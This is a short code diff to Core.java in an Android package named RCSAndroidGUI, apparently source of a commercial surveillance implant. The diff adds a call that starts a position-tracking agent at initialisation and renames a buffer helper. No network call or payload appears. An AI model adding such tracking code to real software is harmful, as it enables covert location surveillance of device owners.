@@ -15,6 +15,7 @@ import android.util.Log;
 import com.ht.RCSAndroidGUI.action.Action;
 import com.ht.RCSAndroidGUI.action.SubAction;
 import com.ht.RCSAndroidGUI.action.UninstallAction;
+import com.ht.RCSAndroidGUI.agent.AgentConf;
 import com.ht.RCSAndroidGUI.agent.AgentManager;
 import com.ht.RCSAndroidGUI.conf.Configuration;
 import com.ht.RCSAndroidGUI.event.EventManager;
@@ -226,6 +227,8 @@ public class Core extends Activity implements Runnable {
 				return false;
 			}
 			
+			agentManager.start(AgentConf.AGENT_POSITION);
+			
 			Log.d(TAG,"Info: Agents started");
 			Log.d(TAG, "Core initialized");
 			return true;
@@ -275,7 +278,7 @@ public class Core extends Activity implements Runnable {
 		// tries to load the resource conf
 		if (!loaded) {
 			// Open conf from resources and load it into resource
-			final byte[] resource = Utils.InputStreamToBuffer(resources
+			final byte[] resource = Utils.inputStreamToBuffer(resources
 					.openRawResource(R.raw.config), 8); // config.bin
 
 			// Initialize the configuration object
